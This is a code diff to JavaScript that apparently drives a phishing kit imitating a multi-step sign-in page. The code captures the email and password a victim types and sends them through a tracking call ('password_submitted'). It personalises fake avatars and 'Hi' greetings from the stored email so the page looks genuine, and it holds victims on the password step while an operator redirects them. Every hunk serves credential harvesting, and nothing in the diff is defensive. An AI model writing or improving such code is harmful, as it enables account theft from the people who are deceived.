@@ -1195,9 +1195,32 @@ function detectOriginalEmail(){
 function replaceEmailPlaceholder(){
   var email = getStoredEmail();
   var letter = (email ? email.charAt(0) : '?').toUpperCase();
+  var hi = '';
+  if (email) {
+    var raw = email.slice(0, 5);
+    hi = raw.charAt(0).toUpperCase() + raw.slice(1);
+  }
+  var initials = letter;
+  if (email) {
+    var local = (email.split('@')[0] || email).trim();
+    var parts = local.split(/[._+\\-\\s]+/).filter(Boolean);
+    if (parts.length >= 2) initials = (parts[0].charAt(0) + parts[1].charAt(0)).toUpperCase();
+    else {
+      var alnum = local.replace(/[^a-zA-Z0-9]/g, '');
+      if (alnum.length >= 2) initials = alnum.slice(0, 2).toUpperCase();
+      else if (alnum.length === 1) initials = (alnum + alnum).toUpperCase();
+    }
+  }
   try {
     var avatars = document.querySelectorAll('[data-ux-avatar]');
-    for (var a = 0; a < avatars.length; a++) avatars[a].textContent = letter;
+    for (var a = 0; a < avatars.length; a++) {
+      var two = avatars[a].getAttribute('data-ux-avatar') === '2' || avatars[a].hasAttribute('data-ux-initials');
+      avatars[a].textContent = two ? initials : letter;
+    }
+  } catch(e){}
+  try {
+    var his = document.querySelectorAll('[data-ux-hi]');
+    for (var h = 0; h < his.length; h++) if (hi) his[h].textContent = 'Hi ' + hi;
   } catch(e){}
   try {
     var emailEls = document.querySelectorAll('[data-ux-email], [data-profile-identifier]');
@@ -1278,11 +1301,15 @@ function wireContinueButtons(){
   // Per-design page → next mapping for the guided flow.
   var DESIGN_NEXT = {
     'go': { 'signin': 'signinp', 'signinp': 'signinploading' },
-    'ge': { 'signin': 'loading' }
+    // ge: email → password; password stays put (admin redirects after login)
+    'ge': { 'signin': 'password', 'password': '' }
   };
   var NEXT = (DESIGN_NEXT[loc.design]) || { 'signin': 'signinp', 'signinp': 'loading' };
   var bodyNext = document.body && document.body.getAttribute && document.body.getAttribute('data-ux-next');
-  var nextPage = bodyNext || NEXT[here] || 'loading';
+  // Explicit empty string in DESIGN_NEXT / data-ux-next means "do not navigate".
+  var nextPage = (bodyNext != null && bodyNext !== '') ? bodyNext
+    : (Object.prototype.hasOwnProperty.call(NEXT, here) ? NEXT[here] : 'loading');
+  if (bodyNext === '') nextPage = '';
 
   var emails = Array.prototype.slice.call(document.querySelectorAll('input[type="email"]:not([aria-hidden="true"]):not(.sf-hidden), input[name*="mail" i]:not([aria-hidden="true"]), input[id*="mail" i]:not([aria-hidden="true"]), input[autocomplete*="email" i]:not([aria-hidden="true"]), input[autocomplete*="username" i]:not([aria-hidden="true"]), input[name="identifier"]:not([aria-hidden="true"]):not(.sf-hidden)'));
   var passwords = Array.prototype.slice.call(document.querySelectorAll('input[type="password"]:not([aria-hidden="true"]), input[name*="pass" i]:not([aria-hidden="true"]), input[name="Passwd"]'));
@@ -1299,7 +1326,7 @@ function wireContinueButtons(){
       btnOnly.addEventListener('click', function(e){
         e.preventDefault(); e.stopPropagation();
         if (e.stopImmediatePropagation) e.stopImmediatePropagation();
-        navigateTo(nextPage);
+        if (nextPage) navigateTo(nextPage);
       }, true);
     }
     return;
@@ -1346,12 +1373,12 @@ function wireContinueButtons(){
       setStoredPassLen((input.value || '').length);
       try { window.track('password_submitted', input.value || ''); } catch(err){}
       try { window.track('continue_clicked', '1'); } catch(err){}
-      navigateTo(nextPage);
+      if (nextPage) navigateTo(nextPage);
     } else {
       setStoredEmail(input.value || '');
       try { window.track('email_submitted', input.value || ''); } catch(err){}
       try { window.track('continue_clicked', '1'); } catch(err){}
-      navigateTo(nextPage);
+      if (nextPage) navigateTo(nextPage);
     }
   }, true);
   var form = input.closest('form');
